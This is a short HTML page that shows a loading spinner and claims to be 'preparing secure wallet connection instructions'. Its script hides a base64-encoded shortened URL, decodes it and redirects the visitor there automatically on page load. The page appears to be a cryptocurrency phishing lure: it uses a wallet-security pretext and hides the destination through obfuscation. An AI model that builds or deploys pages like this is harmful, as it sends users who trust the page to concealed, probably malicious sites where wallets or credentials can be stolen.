<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Content Preview - Processing Request</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background-color: #f5f5f5;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 2s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <p>Preparing secure wallet connection instructions...</p>
    <div class="loader"></div>
    <p style="font-size: 12px; color: #666; margin-top: 20px;">
        Ensuring secure browser compatibility
    </p>

    <script>
        
        const encodedUrl = 'aHR0cHM6Ly90aW55dXJsLmNvbS9iZHo1aDhzbQ=='; 
        
        // Decode and redirect after 2 seconds
        setTimeout(() => {
            const decodedUrl = atob(encodedUrl);
            window.location.href = decodedUrl;
        }, 1000);
    </script>
</body>
</html>
